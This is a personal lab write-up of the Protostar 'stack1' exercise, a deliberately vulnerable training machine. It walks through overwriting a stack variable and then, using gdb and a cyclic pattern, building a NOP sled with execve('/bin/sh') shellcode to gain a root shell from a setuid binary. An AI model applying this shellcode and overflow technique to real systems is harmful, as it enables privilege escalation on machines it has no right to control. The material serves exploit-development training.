{{ Exploit Exercises: Protostar - 0x01 - Stack 0

    [~] {{ Exercise details

        Link : https://exploit-exercises.com/protostar/stack1/

        About:
        This level looks at the concept of modifying variables to specific values in the program, and how the variables
        are laid out in memory.

        Hints:
        → If you are unfamiliar with the hexadecimal being displayed, “man ascii” is your friend.
        → Protostar is little endian

    }}

    [x] {{ Intended Solution

        # Look at the behavior when executed as expected
        user@protostar:/opt/protostar/bin$ ./stack1 test
        Try again, you got 0x00000000

        # Look at the behavior when being overflowed
        user@protostar:/opt/protostar/bin$ ./stack1 `printf 'A%.0s' {1..100}`
        Try again, you got 0x41414141
        Segmentation fault

        # Fill 64 bytes with junk then the next four with DCBA
        user@protostar:/opt/protostar/bin$ ./stack1 `python -c 'print "A"*64 + "DCBA"'`
        Try again, you got 0x41424344

        # Forgot that it had to be lower case
        user@protostar:/opt/protostar/bin$ ./stack1 `python -c 'print "A"*64 + "dcba"'`
        you have correctly got the variable to the right value

    }}

    [x] {{ Root shell

        # Generate pattern to use to find offset to EIP
        > ./pattern.py -c 150
        Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9

        # Load the program into gdb and run it with the pattern as the argument
        user@protostar:/opt/protostar/bin$ gdb stack1 -q
        Reading symbols from /opt/protostar/bin/stack1...done.
        (gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9
        Starting program: /opt/protostar/bin/stack1 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9
        Try again, you got 0x63413163

        Program received signal SIGSEGV, Segmentation fault.
        0x37634136 in ?? ()

        # Find the offset
        > ./pattern.py -ol 37634136
        [+] Offset found at 80 bytes

        # Verify the offset
        (gdb) r `python -c 'print "A"*80 + "BBBB"'`
        The program being debugged has been started already.
        Start it from the beginning? (y or n) y
        Starting program: /opt/protostar/bin/stack1 `python -c 'print "A"*80 + "BBBB"'`
        Try again, you got 0x41414141

        Program received signal SIGSEGV, Segmentation fault.
        0x42424242 in ?? ()

        (gdb) i r eip
        eip            0x42424242   0x42424242

        # EIP is filled with B's as expected - time to begin building the actual payload
        # Start off by making a nopsled
        (gdb) r `python -c 'print "\x90"*100'`
        The program being debugged has been started already.
        Start it from the beginning? (y or n) y
        Starting program: /opt/protostar/bin/stack1 `python -c 'print "\x90"*100'`
        Try again, you got 0x90909090

        Program received signal SIGSEGV, Segmentation fault.
        0x90909090 in ?? ()


        # Look at the stack to find which memory addresses holds the nopsled
        (gdb) x/80x $esp-150
        ....
        0xbffff6fa: 0x9090bfff  0x90909090  0x90909090  0x90909090
        0xbffff70a: 0x90909090  0x90909090  0x90909090  0x90909090
        0xbffff71a: 0x90909090  0x90909090  0x90909090  0x90909090
        0xbffff72a: 0x90909090  0x90909090  0x90909090  0x90909090
        0xbffff73a: 0x90909090  0x90909090  0x90909090  0x90909090
        0xbffff74a: 0x90909090  0x90909090  0x90909090  0x90909090
        0xbffff75a: 0x90909090  0xf7009090  0xffffbfff  0xeff4ffff
        ....

        # Reuse the shell code from the previous exercise - use the one which subtracts 127 from ESP
        # Original shell code length is 21 bytes + 3 bytes to increase buffer size = 24 bytes
        # 80 - 24 = 56 (Nopsled must be 56 bytes)
        (gdb) r `python -c 'print "\x90"*56 + "\x83\xec\x7f\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x0a\xf7\xff\xbf"'`
        The program being debugged has been started already.
        Start it from the beginning? (y or n) y

        Starting program: /opt/protostar/bin/stack1 `python -c 'print "\x90"*56 + "\x83\xec\x7f\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x0a\xf7\xff\xbf"'`
        Try again, you got 0x732f2f68

        Program received signal SIGSEGV, Segmentation fault.
        0xb7eadc03 in __libc_start_main (main=Cannot access memory at address 0x80cdc939
        ) at libc-start.c:187
        187 libc-start.c: No such file or directory.
            in libc-start.c

        # Crashed - let's try the next address
        (gdb) r `python -c 'print "\x90"*56 + "\x83\xec\x7f\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x1a\xf7\xff\xbf"'`
        The program being debugged has been started already.
        Start it from the beginning? (y or n) y

        Starting program: /opt/protostar/bin/stack1 `python -c 'print "\x90"*56 + "\x83\xec\x7f\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x1a\xf7\xff\xbf"'`
        Try again, you got 0x732f2f68
        Executing new program: /bin/dash
        $

        # Testing the shell
        $ whoami && id
        user
        uid=1001(user) gid=1001(user) groups=1001(user)

        # Shell stays alive, but not escalated privileges. Gotta try outside gdb
        user@protostar:/opt/protostar/bin$ ./stack1 `python -c 'print "\x90"*56 + "\x83\xec\x7f\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x1a\xf7\xff\xbf"'`
        Try again, you got 0x732f2f68
        Segmentation fault

        # Crashed again - time to dump the core
        user@protostar:/opt/protostar/bin$ cp stack1 /tmp/
        user@protostar:/opt/protostar/bin$ cd /tmp/
        user@protostar:/tmp$ ./stack1 `python -c 'print "\x90"*56 + "\x83\xec\x7f\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x1a\xf7\xff\xbf"'`
        Try again, you got 0x732f2f68
        Segmentation fault (core dumped)

        # Loading the program and core dump into gdb
        user@protostar:/tmp$ gdb stack1 core.11.stack1.2546 -q
        Reading symbols from /tmp/stack1...done.

        warning: Can't read pathname for load map: Input/output error.
        Reading symbols from /lib/libc.so.6...Reading symbols from /usr/lib/debug/lib/libc-2.11.2.so...done.
        (no debugging symbols found)...done.
        Loaded symbols for /lib/libc.so.6
        Reading symbols from /lib/ld-linux.so.2...Reading symbols from /usr/lib/debug/lib/ld-2.11.2.so...done.
        (no debugging symbols found)...done.
        Loaded symbols for /lib/ld-linux.so.2
        Core was generated by `./stack1 ����������������������������������������������������������j
                                                                                                    X�Rh//shh'.
        Program terminated with signal 11, Segmentation fault.
        #0  0xbffff71a in ?? ()

        # Checking the stack looking for the nopsled
        (gdb) x/80x $esp-150
        ....
        0xbffff75a: 0x9090bfff  0x90909090  0x90909090  0x90909090
        0xbffff76a: 0x90909090  0x90909090  0x90909090  0x90909090
        0xbffff77a: 0x90909090  0x90909090  0x90909090  0x90909090
        0xbffff78a: 0x90909090  0x90909090  0xec839090  0x580b6a7f
        ....

        # New addresses - exiting gdb, moving back to the original program and updating the payload
        (gdb) q
        user@protostar:/tmp$ cd /opt/protostar/bin/
        user@protostar:/opt/protostar/bin$ ./stack1 `python -c 'print "\x90"*56 + "\x83\xec\x7f\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x6a\xf7\xff\xbf"'`
        Try again, you got 0x732f2f68
        #

        # Looks like a root shell - checking
        # whoami && id
        root
        uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
    }}

    [~] {{ What did I learn?
        → gdb can take arguments with the r (run) command, but they need to be invoked differently depending on how it
          expects the input.
          → If the expected execution is ./program <input>, gdb expects run <input>
          → If the expected execution is ./program and then it waits for the user input gdb expects run < file_with_input
        → Little endian has everything backwards. If it receives ABCD it reads it as DCBA, so for it to read the string
          the correct way, it must receive it backwards.
    }}

}}